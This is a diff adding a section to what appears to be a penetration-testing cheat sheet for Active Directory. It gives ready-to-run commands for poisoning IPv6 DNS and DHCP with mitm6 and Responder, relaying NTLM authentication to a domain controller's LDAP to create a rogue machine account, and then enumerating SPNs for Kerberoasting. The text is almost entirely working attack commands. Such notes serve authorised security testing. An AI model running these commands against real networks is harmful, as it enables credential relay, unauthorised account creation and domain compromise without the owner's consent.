@@ -30,3 +30,11 @@
   `mitm6 -d domain.local`   
 - Start ntlmrelayx to e.g. target LDAP on the DC (for querying AD information):   
   `sudo ntlmrelayx.py -6 -t ldap://dc01 --no-smb-server -wh attacker-wpad -h`   
+## Fake machine account creation
+- Start ntlmrelayx targeting a DC to add a computer:   
+  `sudo ntlmrelayx.py -6 -t ldap://dc01 --add-computer --no-smb-server -wh attacker-wpad -h`   
+- Run Responder with DHCP server:   
+  `./Responder.py -I eth0 -Pdv`   
+- After the new computer was created, you can use this to e.g. query SPNs in the domain:   
+  `GetUserSPNs.py 'domain.local/NEWCOMPUTER$' -dc-ip 10.10.0.1`  
+Note: Remember to cleanup the computer afterwards! (requires DA)	  
